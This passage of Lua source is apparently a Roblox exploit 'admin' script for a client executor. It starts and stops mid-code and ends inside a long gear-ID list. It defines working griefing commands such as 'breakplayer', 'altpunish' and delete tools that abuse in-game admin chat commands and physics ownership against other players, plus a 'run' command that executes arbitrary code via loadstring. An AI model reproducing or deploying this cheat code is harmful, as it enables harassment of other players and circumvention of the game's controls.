ColorXD = NormalizedColor(game.Players.LocalPlayer.Character.Torso.Color.R*255 + GetRawVolume(),game.Players.LocalPlayer.Character.Torso.Color.G*255 + GetRawVolume(),game.Players.LocalPlayer.Character.Torso.Color.B*255 + GetRawVolume())
else
ColorXD = NormalizedColor(CustomColor.R*255 + GetRawVolume(),CustomColor.G*255 + GetRawVolume(),CustomColor.B*255 + GetRawVolume())
end
end

for i,v in pairs(Parts) do
	if v and v.Parent ~= nil then
		spawn(function()
			if CustomMode==1 then
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=v,["Color"]=NormalizedColor(math.random(0,255),math.random(0,255),math.random(0,255))})
			else
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=v,["Color"]=ColorXD})
			end
		end)
	end
end
end) wait(UpdTime) until not Loops.partvisualizera

LoadParts()
end)if not s then print(f)end
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("reanimate",{},function()
	if PersonsAdmin then
		local char = game.Players.LocalPlayer.Character
		char.Archivable = true
		
		local fakechar = char:Clone()
		fakechar.Name = "_chariiStupidAdmin"
		fakechar.Parent = workspace
		
		game.Players.LocalPlayer.Character = fakechar
		
		fakechar.Animate.Disabled = true
		fakechar.Animate.Disabled = false
		
		Loops.reanimate = true
		
		local Limbs = {}
		Limbs.LA = Instance.new("Part")
		Limbs.RA = Instance.new("Part")
		Limbs.LL = Instance.new("Part")
		Limbs.RL = Instance.new("Part")
		
		for i,v in pairs(Limbs) do
			v.Name = "Temporary"
		end
		
		local LimbNames = {
			["LA"] = "Left Arm",
			["RA"] = "Right Arm",
			["LL"] = "Left Leg",
			["RL"] = "Right Leg"
		}
		
		Connections.reanimate = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
			if v.Name ~= "Part" then return end
			if not v:IsA("BasePart") then return end
			if v.Size ~= Vector3.new(1,2,1) then return end
			
			for i,v2 in pairs(Limbs) do
				if v2.Parent == nil then
					Limbs[i] = v
					break
				end
			end
		end)
		
		local fixLimbsDebounce = false
		local function fixLimbs()
			if fixLimbsDebounce then return end
			print("Limbfix requested")
			
			fixLimbsDebounce = true
			spawn(function()
				wait(1)
				fixLimbsDebounce = false
			end)
			
			for i,v in pairs(Limbs) do
				if v.Parent == nil then
					game.Players:Chat("part/1/2/1")
				end
			end
		end
		
		fixLimbs()
		
		spawn(function()
			while Loops.reanimate do game:GetService("RunService").RenderStepped:Wait()
				char = workspace[game.Players.LocalPlayer.Name]
				for i,v in pairs(char:GetDescendants()) do
					if v:IsA("BasePart") and v.CanCollide then
						v.CanCollide = false
					end
					if v:IsA("BasePart") then
						v.Transparency = 1
						v.Velocity = Vector3.new()
						v.RotVelocity = Vector3.new()
					end
				end
				
				if char:FindFirstChild("Left Arm") then
					game.Players:Chat("removelimbs me")
					char:FindFirstChild("Left Arm"):Destroy()
				end
				
				char.HumanoidRootPart.CFrame = fakechar.Torso.CFrame
				if game.Players.LocalPlayer.Character ~= fakechar then
					game.Players.LocalPlayer.Character = fakechar
				end
				
				for i,v in pairs(Limbs) do
					if v.Parent ~= nil then
						v.CFrame = fakechar[LimbNames[i]].CFrame
						v.CanCollide = false
						v.Velocity = Vector3.new()
						v.RotVelocity = Vector3.new()
					else
						fixLimbs()
					end
				end
			end
		end)
	else
		GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.")
	end
end)

addCommand("unreanimate",{},function()
	Loops.reanimate = false
	Connections.reanimate:Disconnect()
	workspace["_chariiStupidAdmin"]:Destroy()
	game.Players:Chat("reset me")
end)

addCommand("fixreanimate",{},function()
	runCommand(prefix.."unreanimate",{})
	local chr = game.Players.LocalPlayer.Character
	repeat wait() until not chr or chr.Parent == nil
	runCommand(prefix.."reanimate",{})
end)

addCommand("unpartvisualizer",{},function()
Connections.partvisualizera:Disconnect()
Connections.partvisualizerb:Disconnect()
Loops.partvisualizer = false
end)

addCommand("unpartvisualizerwebsocket",{},function()
Connections.partvisualizera:Disconnect()
Connections.partvisualizerb:Disconnect()
Connections.partvisualizerc:Disconnect()
Loops.partvisualizera = false
Loops.partvisualizerb = false
end)

addCommand("fixnet",{},function()
	fixNet()
end)

addCommand("nethelper",{},function()
	Connections.nethelper = game:GetService("RunService").Heartbeat:Connect(function()
		fixNet()
	end)
end)

addCommand("unnethelper",{},function()
	Connections.nethelper:Disconnect()
end)

addCommand("unloadparts",{},function()
	for i,v in pairs(workspace.Terrain["_Game"].Folder:GetChildren()) do
		if v:IsA("Part") and v.Name == "Part" then
			v:Destroy()
		end
	end
end)

addCommand("insert",{"modelid (optional transparency-threshhold)"},function(args)
if PersonsAdmin then
if not args[2] then args[2]="0.75" end
function Netify(Part,Pos)
	fixNet()
	spawn(function()
	wait(.5)
	Part.Anchored = true
	wait(.5)
	Part.CanCollide = false
	local FakeCollide = Instance.new("Part",Part)
	FakeCollide.Transparency = 1
	FakeCollide.Anchored = true
	FakeCollide.CFrame = Part.CFrame
	FakeCollide.Size = Part.Size
	end)
	spawn(function()
		repeat game:GetService("RunService").Heartbeat:Wait()
			Part.CFrame = Pos
			Part.Velocity = Vector3.new(34,54,0)
		until not Part
	end)
end

local CurChar = game.Players.LocalPlayer.Character
local Model = Instance.new("Model",workspace)
Model.Name = "WITH LOVE FROM II <3"
local Primarypart = Instance.new("Part",Model)
Primarypart.CFrame = CFrame.new(0,0,0)
Primarypart.Size = Vector3.new(0.05,0.05,0.05)
Primarypart.CanCollide = false
Primarypart.Anchored = true
Primarypart.Transparency = 1
Model.PrimaryPart = Primarypart

for i,v in pairs(game:GetObjects("rbxassetid://"..args[1])) do
v.Parent = Model
if v:IsA("Model") then
v:MoveTo(Vector3.new(0,0,0))
else
pcall(function()
v.CFrame = CFrame.new(0,0,0)
end)
pcall(function()
v.Position = Vector3.new()
end)
end
pcall(function()
for i,newv in pairs(v:GetDescendants()) do
pcall(function()
newv.Anchored = true
end)
end
end)
end
Model:MoveTo(game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,10,0))

for i,v in pairs(Model:GetDescendants()) do
pcall(function()
v.Anchored = true
end)
end

local MoveTool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
MoveTool.Name = "Move Model"
MoveTool.RequiresHandle = false
MoveTool.Activated:Connect(function()
	Model:MoveTo(game.Players.LocalPlayer:GetMouse().Hit.Position)
end)

local Confirm = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
Confirm.Name = "Confirm"
Confirm.RequiresHandle = false
Confirm.Activated:Connect(function()
	Confirm:Destroy()
end)

local Cancel = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
Cancel.Name = "Cancel"
Cancel.RequiresHandle = false
Cancel.Activated:Connect(function()
	Cancel:Destroy()
end)

repeat wait() until not Confirm or (Confirm.Parent ~= game.Players.LocalPlayer.Backpack and Confirm.Parent ~= CurChar) or not Cancel or (Cancel.Parent ~= game.Players.LocalPlayer.Backpack and Cancel.Parent ~= CurChar)
if CurChar.Parent ~= nil and Cancel.Parent ~= nil then
	MoveTool:Destroy()
	Cancel:Destroy()
	print("Building model")
	
	print("Repairing model")
	for i,v in pairs(Model:GetDescendants()) do
		if v:IsA("BasePart") then
			if v.Size.X>10 or v.Size.Y>10 or v.Size.Z>10 then
				local vParent = v.Parent
				
				for i,v in pairs(splitPart(v)) do
					v.Parent = Model
				end
			end
		else
			if not (v:IsA("Model") or v:IsA("Folder") or v:IsA("Configuration")) then
				print(v:GetFullName().." is not a Part ("..v.ClassName..") and has been deleted")
				v:Destroy()
			end
		end
	end

	for i,v in pairs(Model:GetDescendants()) do
	pcall(function()
		if v and v.Transparency and v.Transparency>tonumber(args[2]) then
			print("Part "..v:GetFullName().." is over "..args[2].." transparency and has been deleted")
			v:Destroy()
		end
	end)
	end
	
	for i,v in pairs(Model:GetDescendants()) do
		if v:IsA("BasePart") or v:IsA("Seat") then
			local Replacement = Instance.new("Part",Model)
			Replacement.Anchored = true
			Replacement.CFrame = v.CFrame
			Replacement.Size = v.Size
			Replacement.Color = v.Color
			v:Destroy()
		else
			v:Destroy()
		end
	end
	
	print("Formatting parts to table")
	local Parts = {}
	for i,v in pairs(Model:GetDescendants()) do
		if not (v:IsA("Model") or v:IsA("Folder") or v:IsA("Configuration")) then
			table.insert(Parts,{v.CFrame,v.Size,v.Color})
			v:Destroy()
		end
	end
	
	print("Cleaning")
	Model:Destroy()
	
	GetPaint()
	
	print("Building model from table")
	local Part = nil
	local FirstPart = nil
	local LookingFor = nil
	local ChildAdded = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
		pcall(function()
			if v and v.Size and LookingFor and v.Size == LookingFor[2] then
				Part = v
			end
		end)
	end)
	for i,v in pairs(Parts) do
		local Pos = v[1]
		local Size = v[2]
		local Color = v[3]
		LookingFor = v
		Part = nil
		game.Players:Chat("part/"..tostring(Size.X).."/"..tostring(Size.Y).."/"..tostring(Size.Z))
		if i~=1 then
			if FirstPart.Parent==nil then
				print("Parts were destroyed, cancelling")
				break
			end
		end
		repeat wait() until Part
		if i==1 then
			FirstPart = Part
		end
		task.spawn(function()
		GetPaint():WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{["Part"]=Part,["Color"]=Color})
		end)
		Netify(Part,Pos)
	end
else
	Model:Destroy()
	MoveTool:Destroy()
	Confirm:Destroy()
	print("Build cancelled")
end
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("draw",{"size","waittime","israinbow","r","g","b"},function(args)
if PersonsAdmin then
	local Size = tonumber(args[1])
local WaitTime = tonumber(args[2])
local IsRainbow = stringToBool(args[3])
local Color = Color3.fromRGB(tonumber(args[4]),tonumber(args[5]),tonumber(args[6]))

local IsMouseDown = false
Connections.drawa = game:GetService("UserInputService").InputBegan:Connect(function(thing,gp)
	if not gp and thing.UserInputType == Enum.UserInputType.MouseButton1 then
		IsMouseDown = true
	end
end)
Connections.drawb = game:GetService("UserInputService").InputEnded:Connect(function(thing,gp)
	if not gp and thing.UserInputType == Enum.UserInputType.MouseButton1 then
		IsMouseDown = false
	end
end)

local Positions = {}
local PartsPlaced = 0

Connections.drawc = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(part)
	if part.Size and part.Size == Vector3.new(Size,Size,Size) then
		local Paint
		pcall(function()
			Paint = GetPaint()
		end)
		Paint.LocalScript.Disabled = true
		if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PaletteGui") then
			game.Players.LocalPlayer.PlayerGui.PaletteGui:Destroy()
		end
		if IsRainbow then Color = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)) end
		spawn(function()
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=part,["Color"]=Color})
		end)
		PartsPlaced = PartsPlaced + 1
		local WhereOne= Positions[PartsPlaced]
		task.spawn(function()
			fixNet()
			pcall(function()
				part.CanCollide = false
			end)
			task.spawn(function()
				wait(.5)
				part.Anchored = true
			end)
			while true do game:GetService("RunService").RenderStepped:Wait()
				part.Velocity = Vector3.new(34,54,0)
				part.CFrame = WhereOne
			end
			Positions = {}
			PartsPlaced = 0
		end)
	end
end)

Loops.draw = true
repeat wait(WaitTime)
	if IsMouseDown then
		spawn(function()
		table.insert(Positions,CFrame.new(game.Players.LocalPlayer:GetMouse().Hit.p))
		local TheOneIAdded = #Positions
		game.Players:Chat("part/"..Size.."/"..Size.."/"..Size)
		end)
	end
until not Loops.draw
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("stopdraw",{},function()
	Loops.draw = false
	Connections.drawa:Disconnect()
	Connections.drawb:Disconnect()
	Connections.drawc:Disconnect()
end)

addCommand("altpunish",{"player"},function(args)
    local People = GetPlayers(args[1])
    for i,v in pairs(People) do
        game.Players:Chat("speed "..v.Name.." inf")
    end
end)

addCommand("altpunish2",{"player"},function(args)
    local People = GetPlayers(args[1])
    for i,v in pairs(People) do
        game.Players:Chat("setgrav "..v.Name.." -9e9")
    end
end)

addCommand("altdisco",{},function()
    local s,f=pcall(function() --  0.5 "..prefix.."colorallbrickcolor Bright red|"..prefix.."colorallbrickcolor Bright yellow|"..prefix.."colorallbrickcolor Bright green|"..prefix.."colorallbrickcolor Bright blue"
    runCommand(prefix.."spamcommand",{"0.5",prefix.."colorallbrickcolor","Bright red|"..prefix.."colorallbrickcolor","Bright","yellow|"..prefix.."colorallbrickcolor","Bright","green|"..prefix.."colorallbrickcolor","Bright","blue"})
    end)
end)

addCommand("unaltdisco",{},function()
    runCommand(prefix.."unspamcommand",{})
end)

addCommand("scriptinfo",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("pm "..v.Name.." ["..ScriptName.."]\n\n"..ScriptName.." is a PRIVATE SCRIPT!\nOnly a select few people have access to this script, and that\nmost likely does not include you. There are "..tostring(#commandlist).." commands in\nour script, and the commands can be viewed by running "..prefix.."cmds\nor "..prefix.."altcmds in chat.")
    end
end)

addCommand("attachtool",{},function()
    local btool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
  local SelectionBox = Instance.new("SelectionBox",game.Workspace)
  local hammer = Instance.new("Part")
  hammer.Parent = btool
  hammer.Name = ("Handle")
  hammer.CanCollide = false
  hammer.Anchored = false


  SelectionBox.Name = "oof"
  SelectionBox.LineThickness = 0.05
  SelectionBox.Adornee = nil
  SelectionBox.Color3 = Color3.fromRGB(0,0,255)
  SelectionBox.Visible = false
  btool.Name = "Attach Tool"
  btool.RequiresHandle = false
  local IsEquipped = false
  local Mouse = game.Players.LocalPlayer:GetMouse()
  
  btool.Equipped:connect(function()
   IsEquipped = true
   SelectionBox.Visible = true
   SelectionBox.Adornee = nil
  end)
  
  btool.Unequipped:connect(function()
   IsEquipped = false
   SelectionBox.Visible = false
   SelectionBox.Adornee = nil
  end)
  
  
  btool.Activated:connect(function()
  if IsEquipped then
    btool.Parent = game.Chat
   local ex = Instance.new'Explosion'
   ex.BlastRadius = 0
   ex.Position = Mouse.Target.Position
   ex.Parent = game.Workspace
local target = Mouse.Target
			function movepart()
				local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.25)
				looping = false
			end
			movepart()
game.Chat["Attach Tool"].Parent = plr.Backpack
chr.HumanoidRootPart.CFrame=pos
spawn(function()
    wait(3)
    if game.Chat:FindFirstChild("Attach Tool") then
        game.Chat["Attach Tool"]:Destroy()
    end
end)
   -- to here

  end
end)
  
  while true do
   SelectionBox.Adornee = Mouse.Target or nil
   wait(0.1)
  end
end)

addCommand("breakplayer",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		game.Players:Chat("unpunish "..v.Name)wait()
		game.Players:Chat("invis "..v.Name)
		game.Players:Chat("reset "..v.Name)
		game.Players:Chat("invisible "..v.Name)
		game.Players:Chat("kill "..v.Name)
		game.Players:Chat("trip "..v.Name)
		game.Players:Chat("setgrav "..v.Name.." -inf")wait(.1)
		game.Players:Chat("invisible "..v.Name)
		game.Players:Chat("unpunish "..v.Name.." "..v.Name.." "..v.Name)wait(.2)
		game.Players:Chat("invisible "..v.Name)wait(.2)
		game.Players:Chat("reset "..v.Name)wait(.15)
		game.Players:Chat("punish "..v.Name.." "..v.Name.." "..v.Name)
	end
end)

addCommand("deletetool",{},function()
    local btool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
  local SelectionBox = Instance.new("SelectionBox",game.Workspace)
  local hammer = Instance.new("Part")
  hammer.Parent = btool
  hammer.Name = ("Handle")
  hammer.CanCollide = false
  hammer.Anchored = false


  SelectionBox.Name = "oof"
  SelectionBox.LineThickness = 0.05
  SelectionBox.Adornee = nil
  SelectionBox.Color3 = Color3.fromRGB(0,0,255)
  SelectionBox.Visible = false
  btool.Name = "Delete Tool"
  btool.RequiresHandle = false
  local IsEquipped = false
  local Mouse = game.Players.LocalPlayer:GetMouse()
  
  btool.Equipped:connect(function()
   IsEquipped = true
   SelectionBox.Visible = true
   SelectionBox.Adornee = nil
  end)
  
  btool.Unequipped:connect(function()
   IsEquipped = false
   SelectionBox.Visible = false
   SelectionBox.Adornee = nil
  end)
  
  
  btool.Activated:connect(function()
  if IsEquipped then
    btool.Parent = game.Chat
   local ex = Instance.new'Explosion'
   ex.BlastRadius = 0
   ex.Position = Mouse.Target.Position
   ex.Parent = game.Workspace
   local prevcfarchive = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local target = Mouse.Target
			function movepart()
				local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.25)
				looping = false
			end
			movepart()
			repeat wait() until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld")
			game.Players:Chat("skydive me")
			wait(0.1)
			game.Players:Chat("respawn me")
			wait(0.25)
game.Chat["Delete Tool"].Parent = plr.Backpack
chr.HumanoidRootPart.CFrame=prevcfarchive
spawn(function()
    wait(3)
    if game.Chat:FindFirstChild("Delete Tool") then
        game.Chat["Delete Tool"]:Destroy()
    end
end)
   -- to here

  end
end)
  
  while true do
   SelectionBox.Adornee = Mouse.Target or nil
   wait(0.1)
  end
end)

addCommand("deletetoolivory",{},function()
    local btool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
  local SelectionBox = Instance.new("SelectionBox",game.Workspace)
  local hammer = Instance.new("Part")
  hammer.Parent = btool
  hammer.Name = ("Handle")
  hammer.CanCollide = false
  hammer.Anchored = false


  SelectionBox.Name = "oof"
  SelectionBox.LineThickness = 0.05
  SelectionBox.Adornee = nil
  SelectionBox.Color3 = Color3.fromRGB(0,0,255)
  SelectionBox.Visible = false
  btool.Name = "Delete Tool"
  btool.RequiresHandle = false
  local IsEquipped = false
  local Mouse = game.Players.LocalPlayer:GetMouse()
  
  btool.Equipped:connect(function()
   IsEquipped = true
   SelectionBox.Visible = true
   SelectionBox.Adornee = nil
  end)
  
  btool.Unequipped:connect(function()
   IsEquipped = false
   SelectionBox.Visible = false
   SelectionBox.Adornee = nil
  end)
  
  
  btool.Activated:connect(function()
  if IsEquipped then
    btool.Parent = game.Chat
   local ex = Instance.new'Explosion'
   ex.BlastRadius = 0
   ex.Position = Mouse.Target.Position
   ex.Parent = game.Workspace
   local prevcfarchive = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local target = Mouse.Target
			moveObject(target,CFrame.new(99999,99999,99999))
			wait(0.5)
			game.Chat["Delete Tool"].Parent = plr.Backpack
chr.HumanoidRootPart.CFrame=prevcfarchive
spawn(function()
    wait(3)
    if game.Chat:FindFirstChild("Delete Tool") then
        game.Chat["Delete Tool"]:Destroy()
    end
end)
   -- to here

  end
end)
  
  while true do
   SelectionBox.Adornee = Mouse.Target or nil
   wait(0.1)
  end
end)

addCommand("run",{"script"},function(args)
    local s,f=pcall(function()
    local fixer = [[local owner = game.Players.LocalPlayer
local player = owner
local localplayer = owner
local lp = owner
local plr = owner
local chr,character,char = owner.Character
local consoleOn = true
game:GetService("RunService").RenderStepped:Connect(function()
    chr=owner.Character
end)
function GetPlayers(jjk)
local boss = lp
local fat = {}
if jjk:lower() == "me" then 
return {boss} 

elseif jjk:lower() == "all" or jjk:lower() == "*" then 
return game:GetService("Players"):GetChildren() 

elseif jjk:lower() == "others" then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v.Name ~= boss.Name then
table.insert(fat,v)
end
end
return fat

elseif jjk:lower() == "random" then
return {game:GetService("Players"):GetChildren()[math.random(1,#game:GetService("Players"):GetChildren())]}

else
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if jjk:lower() == v.Name:lower():sub(1,#jjk) and not table.find(fat,v) then
table.insert(fat,v)
end
end
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if jjk:lower() == v.DisplayName:lower():sub(1,#jjk) and not table.find(fat,v) then
table.insert(fat,v)
end
end
return fat
end

end
]]
    fixer = fixer..args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    loadstring(fixer)()
    end)if not s then print(f)end
end)

addCommand("give",{"gear-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.."%20"..args[i]
    end
    local request = HttpRequest({
        Url="https://catalog.roblox.com/v1/search/items/details?Category=11&Subcategory=5&Limit=10&CreatorName=Roblox&Keyword="..fixer,
        Method=GET
    })
    local decode = game:GetService("HttpService"):JSONDecode(request.Body)
    game.Players:Chat("gear me "..tostring(decode["data"][1]["id"]))
end)

addCommand("copygearid",{"gear-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.."%20"..args[i]
    end
    local request = HttpRequest({
        Url="https://catalog.roblox.com/v1/search/items/details?Category=11&Subcategory=5&Limit=10&CreatorName=Roblox&Keyword="..fixer,
        Method=GET
    })
    local decode = game:GetService("HttpService"):JSONDecode(request.Body)
    setclipboard(tostring(decode["data"][1]["id"]))
end)

addCommand("giverandomgears",{"amount"},function(args)
    local gears = {"121946387","11419319","168141301","15932306","12187348","225921000","127506105","11377306","212296936","253519495","114020480","257810065","10472779","477910063","22960388","147143863","16688968","306971294","99119158","409745306","11452821","46846246","11563251","517827962","170897263","11999247","286526176","223439643","467138029","11453385","467935723","113328094","1402322831","22787248","928914739","16726030","95951330","12848902","16214845","44115926","42321801","52627419","1060280135","106701659","2350122208","1033136271","83021197","1016183873","168143042","1132887630","101106419","172246669","20721924","111876831","928913996","156467855","150366274","168140949","13745494","83021250","21392199","22788134","162857357","1180418251","101078559","28664212","461488745","11450664","116040770","107458429","30393548","13207169","12890798","243790334","21754543","124126871","170903216","57902859","2605965785","32355966","10727852","306971659","163350265","31314966","103358098","12145515","398675172","183355817","15177716","31839337","22596452","2568114215","321582427","295461517","365674685","81847570","119101539","2463674178","88146486","92142799","115377964","108875151","65545955","96669682","98411393","12547976","26421972","16979083","30847779","123234673","430066424","116040789","125859483","65082246","11956382","49491736","2506347092","24346755","89487934","78730532","383608755","1929597345","16722267","319656339","104642566","104642700","147143848","121925044","343586214","517827255","356212933","335132838","416846710","82357123","27494652","192456288","1304339797","236403380","57983532","639345143","92627988","83704169","14719505","168142869","2261167878","125013849","183355892","82357079","1340206957","99119198","168142394","211944997","26014536","2190019650","542755101","26017478","489196923","10758456","287425246","110789105","21440120","29100449","186868758","105289761","336370943","304721834","1241586091","163348575","88143074","73829214","87361806","35366155","34399428","103234612","439988813","1180417820","18474459","2605966484","346687565","30392263","746686384","168141496","1903663829","835780770","55301897","244082303","97161295","163348987","483899693","330296266","123234510","146047188","2569022418","170896941","255800146","15176169","35683911","81847365","15731350","302281291","14131602","29939404","2136391608","15668963","18482570","425121415","139578061","56561570","563288952","450566409","97311482","277955605","3459922232","13477890","118281609","549915884","58574445","19328185","380204314","295460702","218631022","106064469","2350119937","284135286","27858062","21445765","128160832","109583846","39258329","22152195","46360920","257343434","21351465","2463675080","52625744","58574452","29532138","2103276507","47597835","31314931","31839260","30649735","21440056","1117743696","107458461","172248941","163353363","380210977","27245855","34398653","33683368","57229313","30847733","173781053","15470183","542184488","34901961","46132907","154727251","109583822","94333296","142498104","987032734","1074742019","45754061","1829110586","18409191","206136532","122278207","880506541","114020538","16924676","46846115","928805891","1380774367","114687223","99797403","264989911","78367424","2804667002","28671909","112591865","29100543","25974222","226206253","228588651","19111883","189910805","162857391","236443047","44116233","38327125","323192649","10469910","28672001","101110605","32353654","738924664","101078350","20373160","35684857","14864611","58574416","402305186","11885154","18481407","25162389","41457719","31314849","20642023","1258015943","176219131","29345958","21439965","18479966","25158998","48596324","236441643","105189783","1645056094","11419882","99254437","94794774","78005009","2830533679","435116927","15970544","13206887","47871615","57229337","94794833","88143166","106701702","356213494","1929592959","101079008","13206856","183826384","37816777","218634097","327365543","81154592","29099749","1088051376","113299556","44561400","154727487","120749494","83021236","629893424","420161128","80576952","343587237","402304782","99797381","304720496","71037076","66896638","85754656","335086410","32858586","236401511","445150567","2045764727","215448210","42845896","108158439","170903610","63253706","15973059","79446473","2316760298","48159731","88885481","12504077","101191388","103234296","50938746","42845853","602146440","130925426","160189871","106701564","116040807","1230024287","56561593","101078524","151292047","98411325","65979823","754869699","24791472","21392417","53623248","319656563","21802000","1789547756","189756588","18482562","66416602","12902404","84012460","1760406591","157205782","1191128759","30847746","189910262","93136674","208659586","208659734","96095042","80576928","23306097","77443491","14492601","2620524562","233633874","29532089","66426498","158069071","1215515248","47871597","92142841","69964719","83704154","346687267","271017537","74385438","361950795","155662087","18017365","168142620","1258015236","456221232","160198363","346685995","33732371","93136666","1320966824","306163602","190094313","10831489","1360078533","221181437","69499437","215392741","86492467","55917409","92628074","1609498185","147143821","621090617","126719093","99254164","76170471","176087556","160199141","18426536","2620441860","85879465","97932897","49491781","172246820","1001649855","49929724","1304344132","63721711","233520425","2226815033","292969139","98219158","15973049","359244394","53623322","1492225511","24659699","128160929","154727343","97161222","178076749","248285248","610133129","24015579","99254358","91360052","90718350","1708354246","330296114","125013769","478707595","156467963","86494914","498752764","100472084","150366320","94233391","60888225","106701619","146047220","16986649","190094270","113299590","51346336","95951291","130113146","846792499","49929746","1103012605","61459592","129471121","183355732","295460073","62350846","21439991","129471170","95951270","49491716","191261808","147937284","181550181","226206639","68539623","17237675","15470222","176087597","159229806","336371164","59848474","68848741","124126528","176087466","243007180","335085355","12775410","356212121","91294485","420160506","127506324","79446395","563287969","82357101","69567827","73232803","158069180","2544539559","51757158","1402452608","174752245","12187431","63253701","2535102910","99797357","280662667","81330766","287424278","98341183","35293856","21416138","170902990","904534702","104642550","71597072","1132884456","233660801","315617026","315573586","206136361","105351748","413200176","178076831","74385399","59805584","45177979","218631128","1760404984","2445084910","188643628","233520257","66896542","190880295","87361508","37347081","80597060","204095670","54130543","91360028","77443436","553937189","107458531","1536052210","62350883","11115851","70476451","47262951","61916137","170903868","116055112","95258660","15179006","51346471","170896571","56561607","18462637","41457484","903197575","64220933","174752400","160189476","46846024","76170545","69210407","74904396","87361662","139578571","107458483","261439002","80576967","97885289","583159170","47597760","1241156683","746687364","302280931","99119261","10884288","522587921","268586231","186958653","277954704","206798405","48847374","51757126","532254782","70476435","14516975","34898883","118281529","24396804","243791145","19703476","68354832","835779898","146071355","264990158","120307951","101078326","73232786","129471151","1074738432","116693694","27171403","728207067","162857268","1708355542","123234626","155662051","26013203","23727705","88146497","99254241","50938773","42847923","163348758","332748371","332747438","72644644","97161241","97756645","273970482","161211085","236438668","1149193097","160198658","59175777","300410799","73829202","96669697","99254203","104642522","108149201","176087639","191261930","65079090","119101643","54694334","10468915","117498775","317593302","64220952","114020557","52180871","14131296","156467990","89491407","277955084","163355211","173755801","55917420","2163551089","1492226137","27860496","90220438","204095724","159199263","261827192","88146505","90220371","45513247","79446433","184760397","341109697","569678090","160189720","1033137155","621089209","168140813","71037056","139578136","95354259","215355320","54130559","2568200796","114687236","271017937","257343597","2222648398","178076989","99033296","93136746","65079094","2136389582","2463683230","22152234","40493542","22787168","1117745433","13206984","16641274","928796097","2045767145","241512134","118281463","95484354","98253592","176087640","236440696","155661985","125013830","83021217","150363993","70476425","24686580","76170515","97886188","186868641","431038614","183665698","152233381","52625733","88885506","17527923","156467926","243778818","1241587075","54694329","298087401","359179463","57229357","33866846","74385418","72644629","158069110","45941397","2409286506","159199218","13478015","12909278","1536053426","1587165780","66416590","59190543","1829078563","1241586595","99119240","59175769","257812862","159199229","286527185","188853857","74972442","2316759705","549914420","313547087","52180863","869125445","83704165","583157224","122278276","1320966419","11999279","74904413","66896601","46360870","2014805757","2385189785","52180878","22787189","226205948","33382711","1990279115","93709266","21420014","103338520","28277486","51346271","61916132","302502491","1046322934","271017031","84417104","221173389","330295904","50454041","257813288","78005082","64160547","395205750","13477940","228589017","64647651","255800783","181356054","56561579","34398938","185422295","49052716","106064315","54130552","18776718","128162713","163354553","477911027","503957703","62350856","728205177","162857422","1587175338","88143060","67319425","108158379","11999235","61459678","121385262","53623295","122278316","48159815","157205818","2463693263","248287898","102705430","1001653705","385780758","102705402","13841367","97161262","38326803","283756680","125859385","123234545","24440014","63721732","161220552","25741198","241017426","59806354","709399046","365642085","75556791","212500257","47262108","228588531","304720206","99641902","152187198","892003497","387285940","22971409","183355969","73232825","16987194","25545089","50454086","19111894","80661504","287426148","25926517","10510024","101106464","2620523077","60357959","73265108","130113061","78665215","139577901","20064349","527383094","2385192846","467137230","102705454","15470359","33867016","46362414","147937443","138761013","45094376","68603151","1981813154","236442380","96669687","85145662","903199054","188644205","53130867","42845684","65545971","86492583","537374622","254608905","76262706","22969230","16216702","169602010","241017568","2620521684","472607575","445151478","35366215","32858699","106064277","292969932","304719869","96669943","2620451289","53130896","206799274","503957396","92627975","60357989","483308034","503955938","33382537","87361995","511930668","170896461","113299641","108875216","60888308","70476446","163355404","11719016","187840979","18010691","321345839","34870758","183665514","85145626","52180858","86494893","53917288","45513203","22960435","84418938","858740936","45941451","68478587","55917432","71597048","66426103","93136802","100469994","273969902","152187131","53130887","124127383","332747874","88885497","1149579825","99610601","187688069","15397778","73